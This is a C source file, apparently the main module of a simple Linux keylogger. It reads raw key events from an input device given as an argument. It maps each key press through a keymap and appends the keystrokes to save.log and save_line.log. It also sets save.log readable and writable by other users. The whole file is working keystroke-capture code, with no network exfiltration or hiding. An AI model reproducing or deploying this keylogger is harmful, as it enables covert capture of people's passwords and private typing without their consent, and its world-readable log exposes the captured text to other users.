#include "keylogger.h"

t_keylogger *getKlg()
{
	static t_keylogger klg;
	return &klg;
}
void	clean_quit(t_keylogger *klg, int code)
{
	close(klg->keyboardFD);
	close(klg->saveFD);
	exit(code);
}
void    SIGhandler(int signal)
{
	t_keylogger *klg;

	dprintf(STDOUT_FILENO, "SIGNAL: %d\n", signal);
	klg = getKlg();
	clean_quit(klg, INTERUPT);
}

void	selectKey(t_keylogger *klg)
{
	int mod;

	mod = 0;
	if (klg->mod.alt || klg->mod.mod)
		mod += 4;
	if (klg->mod.shift)
		mod += 1;
	dprintf(klg->saveFD, "Key: %i State: %i, desc: %s\n",klg->event.code, klg->event.value, klg->keymap[klg->event.code -1][mod]);
	dprintf(klg->saveLineFD, "%s",klg->keymap[klg->event.code -1][mod]);
	return ;
}
void	recording(t_keylogger *klg)
{
	while(read(klg->keyboardFD, &klg->event, sizeof(klg->event)) > 0)
	{
		if(klg->event.type == EV_KEY && is_mod_key(klg) == FALSE)
		{
			if(klg->event.value == 1)
				selectKey(klg);
		}

	}
	return ;
}
int main(int ac, char **av)
{
	t_keylogger         *klg;
	
	if (ac != 3)
	{
		dprintf(STDOUT_FILENO, "Wrong number of argument\n");
		return 0;
	}
	klg = getKlg();
	signal(SIGINT, SIGhandler);
	dprintf(STDOUT_FILENO, "keyboard file = %s\n", av[1]);
	if((klg->keyboardFD = open(av[1], O_RDONLY)) <= 0)
	{
		dprintf(STDOUT_FILENO, "open file failed\n");
		return 0;
	}
	if((klg->saveFD = open("save.log", O_RDWR | O_CREAT | O_APPEND, 0666)) <= 0)
	{
		dprintf(STDOUT_FILENO, "open save file failed\n");
		return 0;
	}
	if((klg->saveLineFD = open("save_line.log", O_RDWR | O_CREAT | O_APPEND, 0666)) <= 0)
	{
		dprintf(STDOUT_FILENO, "open save file failed\n");
		return 0;
	}
	chmod("save.log", S_IROTH | S_IWOTH);
	if (setKeyMap(klg, av[2]) == ERROR)
		clean_quit(klg, ERROR);
	//printKeyMap(klg);
	recording(klg);
	clean_quit(klg, SUCCESS);
	return 0;
}